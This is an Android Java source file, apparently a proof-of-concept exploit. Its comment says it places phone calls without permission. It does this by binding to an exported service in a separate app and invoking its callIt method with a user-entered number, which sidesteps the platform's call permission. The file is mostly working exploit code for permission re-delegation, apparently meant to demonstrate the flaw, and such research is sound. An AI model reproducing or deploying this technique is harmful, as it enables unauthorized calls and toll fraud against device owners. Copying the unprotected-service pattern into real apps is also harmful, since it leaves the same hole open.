package de.macmark.android.callboy;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import de.macmark.callgirl.ICallService;

//Does phone calls without permission. Uses inter app service from CallBoy.
//For more informations take a look at http://www.macmark.de/android.php#example_exploit4

public class CallDroidActivity extends Activity {

	Button   mButton;
	EditText mEdit;
	ICallService mRemoteService;
	String phoneNumber;
	
	/** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        

        mButton = (Button)findViewById(R.id.button);
        mEdit   = (EditText)findViewById(R.id.textfeld);

        mButton.setOnClickListener(
            new View.OnClickListener()
            {
                public void onClick(View view)
                {
                	phoneNumber = mEdit.getText().toString();
                    Log.e("EditText", phoneNumber);
//                    Intent dialIntent=new Intent(Intent.ACTION_CALL,Uri.parse("tel:"+phoneNumber));
//                    startActivity(dialIntent);
                    
                	Intent serviceIntent=new Intent();
            		serviceIntent.setClassName("de.macmark.callgirl", "de.macmark.callgirl.CallBoyImpl");
            		boolean ok=getApplicationContext().bindService(serviceIntent, mServiceConnection,Context.BIND_AUTO_CREATE);
            		Log.e("====> ok", String.valueOf(ok));
                    
                    
                    Log.e("dialed", phoneNumber);
                }
            });
        
    }

	private ServiceConnection mServiceConnection=new ServiceConnection() {

		public void onServiceDisconnected(ComponentName name) {
			// TODO Auto-generated method stub

		}

		public void onServiceConnected(ComponentName name, IBinder service) {
			// get instance of the aidl binder
			mRemoteService = ICallService.Stub.asInterface(service);
			try {
				mRemoteService.callIt(phoneNumber);
			} catch (RemoteException e) {
				Log.e("RemoteException", e.toString());
			}

		}
	};
}